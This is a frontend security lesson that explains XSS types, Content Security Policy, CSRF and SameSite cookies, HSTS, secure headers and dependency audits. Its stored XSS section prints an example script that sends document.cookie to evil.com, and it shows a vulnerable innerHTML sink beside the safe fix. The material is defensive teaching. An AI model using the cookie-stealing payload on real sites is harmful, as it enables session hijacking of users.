---
title: Frontend Security
order: 7
estMinutes: 35
difficulty: hard
checklist:
  - Distinguish stored, reflected, and DOM-based XSS attacks
  - Configure Content Security Policy headers to prevent XSS
  - Understand CSRF and how SameSite cookies mitigate it
  - Identify which HTTP security headers to set and why
  - Audit third-party dependencies for known vulnerabilities
---

Frontend security is often treated as a backend concern, but the client layer is where user data is rendered, tokens are stored, and third-party scripts run. A single XSS vulnerability can give an attacker full control of a user's session. Understanding the attack vectors and the defence mechanisms is a prerequisite for shipping secure applications.

## Cross-Site Scripting (XSS)

XSS attacks inject malicious scripts into a page that then run in the victim's browser context, with full access to cookies, localStorage, and the DOM.

### Stored XSS

Attacker saves malicious content to the database (e.g., a comment field). When other users view the page, the script runs:

```html
<!-- User submits this comment -->
<script>fetch(`https://evil.com/?c=${document.cookie}`)</script>
```

**Defence:** always HTML-encode user content before rendering. Never use `.innerHTML` with user-supplied data.

### Reflected XSS

Malicious input is embedded in the URL and reflected immediately in the response — no database involved. Common in search pages that echo the query string.

### DOM-Based XSS

The vulnerability lives entirely in client-side code. The attacker controls a DOM source (like `location.hash`) that flows into a dangerous sink:

```ts
// ❌ Dangerous — attacker controls location.hash
document.getElementById("msg").innerHTML = location.hash.slice(1);

// ✅ Safe — textContent does not parse HTML
document.getElementById("msg").textContent = location.hash.slice(1);
```

> [!CAUTION]
> Common dangerous sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout("string")`, `element.src` with user data. Use `textContent` or a sanitization library (DOMPurify) when you must render HTML.

## Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser which sources are allowed to load scripts, styles, images, and other resources. A strict CSP is the most effective XSS mitigation after output encoding:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

With a `nonce`-based CSP, every inline script must carry the server-generated nonce or it will be blocked — even if an attacker injects it.

> [!TIP]
> Use `Content-Security-Policy-Report-Only` first to collect violations without blocking anything. When the report stream is clean, switch to enforcing mode.

## CSRF and SameSite Cookies

Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into sending a forged request to your server. Because the browser automatically attaches cookies, a `<form>` on `evil.com` can silently POST to `bank.com`.

**Mitigations:**

1. **SameSite cookie attribute** — the most practical modern defence:
   - `SameSite=Strict`: cookie is never sent cross-site (breaks OAuth flows)
   - `SameSite=Lax`: cookie is sent on top-level navigations only (good default)
   - `SameSite=None; Secure`: sent cross-site but only over HTTPS

2. **CSRF tokens** — server issues a secret per-session token embedded in forms; attacker cannot read it from a different origin.

```ts
// Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly; Path=/
```

> [!WARNING]
> `HttpOnly` prevents JavaScript from reading the cookie at all — essential for session cookies. An attacker who achieves XSS cannot steal an `HttpOnly` cookie via `document.cookie`.

## HTTPS and HSTS

HTTPS encrypts traffic between the browser and server, preventing eavesdropping and tampering. HTTP Strict Transport Security (HSTS) tells browsers to always use HTTPS, even if the user types `http://`:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Submit your domain to the HSTS preload list to be hardcoded into browsers — zero-tolerance for HTTP, even on first visit.

## Secure HTTP Headers

A minimal secure header set:

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

- `nosniff` prevents browsers from MIME-sniffing a response away from the declared content type
- `X-Frame-Options: DENY` prevents clickjacking (replaced by `frame-ancestors 'none'` in CSP)
- `Permissions-Policy` restricts browser APIs available to the page and its iframes

> [!IMPORTANT]
> Use **securityheaders.com** to score your current headers and get specific remediation advice for each missing or misconfigured header.

## Dependency Audits

Supply chain attacks target your `node_modules`. Run `npm audit` or `pnpm audit` regularly and in CI to catch packages with known CVEs:

```bash
pnpm audit --audit-level=high  # Fail CI on high or critical
```

Tools like **Snyk** and **Socket.dev** go further — they detect typosquatting, obfuscated code, and suspicious publish patterns in new package versions.

> [!NOTE]
> The **OWASP XSS Cheat Sheet** is the definitive reference for XSS attack taxonomy, encoding rules, and framework-specific mitigations.

## Further Learning

Search these terms to go deeper:
- **"OWASP XSS cheat sheet"** — taxonomy, encoding rules, and framework-specific XSS mitigations
- **"OWASP CSRF cheat sheet"** — token patterns, SameSite behaviour, and edge cases
- **"CSP evaluator Google"** — tool that parses a CSP header and identifies weaknesses
- **"web.dev security headers"** — overview of each header, what it does, and how to set it
- **"Socket.dev supply chain security"** — modern approach to detecting malicious npm packages
